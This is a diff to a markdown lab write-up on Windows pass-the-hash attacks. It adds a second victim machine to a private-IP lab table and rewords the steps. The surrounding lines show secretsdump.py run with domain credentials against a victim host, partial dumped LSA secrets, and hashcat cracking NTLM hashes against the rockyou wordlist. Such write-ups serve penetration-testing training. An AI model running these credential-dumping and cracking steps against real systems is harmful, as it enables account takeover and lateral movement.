@@ -52,11 +52,12 @@ Windows stores NTLM hashes in memory while a user is logged in. These hashes can
 ## Lab Setup
 
  ```
-| Machine | Operating System |         Role          |    Ip         |
-|---------|------------------|-----------------------|---------------|
-| Attacker| Kali Linux       | Attacker machine      | 192.168.5.128 |
-| Server  | Windows Server   | Domain Controller     | 192.168.5.134 |
-| Victim  | Windows 10       | Domain joined machine | 192.168.5.135 |
+| Machine  | Operating System |         Role          |    Ip         |
+|----------|------------------|-----------------------|---------------|
+| Attacker | Kali Linux       | Attacker machine      | 192.168.5.128 |
+| Server   | Windows Server   | Domain Controller     | 192.168.5.134 |
+| Victim 1 | Windows 10       | Domain joined machine | 192.168.5.135 |
+| Victim 2 | Windows 10       | Domain joined machine | 192.168.5.136 |
  ```
 
 # Attack Steps
@@ -187,6 +188,7 @@ NL$KM:4b8fca52bf95f183bd044d00f506d9a5d7acc0e8e595e93ceab740ae2e583afacbd830185a
 ```bash
 secretsdump.py readteambd/rahimkhan:Password1@192.168.5.136
 ```
+
 VICTIM-2:
 ```
 [*] Service RemoteRegistry is in stopped state
@@ -227,7 +229,7 @@ NL$KM:c7b7b5bda0d33e8662bffb11e1899ab8aaebb5b87948115fcbecc5993510e8604427d5cb0a
 
 ## Step 3 — Save the Hashes
 
-Opened a file and dropped in the hashes I want to crack and use:
+I opened a file and pasted the hashes I wanted to crack and use later.
 
 ```bash
 nano passthehash.txt
@@ -235,12 +237,14 @@ nano passthehash.txt
 
 ## Step 4 — Crack the Hashes with Hashcat
 
-Run:
+I used Hashcat and the rockyou wordlist to crack the NTLM hashes I collected.
 
 ```bash
 hashcat -m 1000 passthehash.txt /usr/share/wordlists/rockyou.txt
 ```
 -m 1000 tells hashcat these are NTLM hashes.
+
+After running the command, Hashcat cracked one of the hashes and recovered the password.
 
 Results:
 
